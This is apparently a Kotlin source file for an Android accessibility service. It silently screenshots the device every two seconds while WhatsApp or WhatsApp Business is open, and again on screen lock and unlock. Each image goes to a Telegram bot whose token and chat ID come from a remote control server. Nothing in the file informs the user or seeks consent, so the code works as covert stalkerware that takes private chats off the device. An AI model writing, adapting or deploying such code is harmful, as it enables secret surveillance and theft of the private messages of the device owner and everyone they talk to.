//app/src/main/java/com/example/appmonitor/MonitorService.kt//
package com.example.appmonitor

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MonitorAccessibilityService : AccessibilityService() {
    private val handler = Handler(Looper.getMainLooper())
    private var isLoopActive = false
    private var screenStateReceiver: BroadcastReceiver? = null

    private val serverConfigUrl = "https://app-control-server-54oe.onrender.com/api/config"

    private val monitoredPackages = listOf(
        "com.whatsapp",
        "com.whatsapp.w4b"
    )

    private val screenshotRunnable = object : Runnable {
        override fun run() {
            fetchConfigFromServer { config ->
                if (config == null || !config.optBoolean("active", true)) {
                    isLoopActive = false
                    return@fetchConfigFromServer
                }

                val activeRootNode = rootInActiveWindow
                val activePackage = activeRootNode?.packageName?.toString()

                if (activePackage != null && monitoredPackages.contains(activePackage)) {
                    captureAndSendScreenshot(activePackage, "app_$activePackage", config)
                    handler.postDelayed(this, 2000)
                } else {
                    isLoopActive = false
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        registerScreenReceiver()
    }

    private fun registerScreenReceiver() {
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenStateReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    Intent.ACTION_SCREEN_OFF -> {
                        captureScreenEvent("screen_off")
                    }
                    Intent.ACTION_USER_PRESENT -> {
                        handler.postDelayed({
                            captureScreenEvent("screen_unlocked")
                        }, 1000)
                    }
                }
            }
        }
        registerReceiver(screenStateReceiver, filter)
    }

    private fun captureScreenEvent(tag: String) {
        fetchConfigFromServer { config ->
            if (config != null && config.optBoolean("active", true)) {
                captureAndSendScreenshot("", tag, config)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: return

        if (monitoredPackages.contains(packageName)) {
            if (!isLoopActive) {
                isLoopActive = true
                handler.removeCallbacks(screenshotRunnable)
                handler.post(screenshotRunnable)
            }
        } else {
            if (packageName != this.packageName) {
                isLoopActive = false
                handler.removeCallbacks(screenshotRunnable)
            }
        }
    }

    private fun fetchConfigFromServer(callback: (JSONObject?) -> Unit) {
        Thread {
            try {
                val url = URL(serverConfigUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 10000
                conn.readTimeout = 10000

                val responseString = conn.inputStream.bufferedReader().use { it.readText() }
                val jsonObject = JSONObject(responseString)
                handler.post { callback(jsonObject) }
            } catch (e: Exception) {
                e.printStackTrace()
                handler.post { callback(null) }
            }
        }.start()
    }

    private fun captureAndSendScreenshot(currentPackage: String, customPrefix: String, config: JSONObject) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    val hardwareBuffer = screenshot.hardwareBuffer
                    val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                    hardwareBuffer.close()

                    if (bitmap != null) {
                        val mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true)
                        val stream = ByteArrayOutputStream()
                        mutableBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                        sendTelegramPhoto(stream.toByteArray(), customPrefix, config)
                    }
                }

                override fun onFailure(errorCode: Int) {}
            })
        }
    }

    private fun sendTelegramPhoto(photoBytes: ByteArray, prefix: String, config: JSONObject) {
        Thread {
            try {
                val botToken = config.getString("bot_token")
                val chatId = config.getString("chat_id")

                val timeStamp = System.currentTimeMillis()
                val fileName = "${prefix}_${timeStamp}.jpg"

                val boundary = "Boundary_" + System.currentTimeMillis()
                val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val outputStream = conn.outputStream
                val writer = OutputStreamWriter(outputStream, "UTF-8")

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.append("$chatId\r\n")
                writer.flush()

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
                writer.append("Content-Type: image/jpeg\r\n\r\n")
                writer.flush()

                outputStream.write(photoBytes)
                outputStream.flush()

                writer.append("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()

                conn.responseCode
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        isLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
        if (screenStateReceiver != null) {
            unregisterReceiver(screenStateReceiver)
        }
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {
        isLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
    }
}
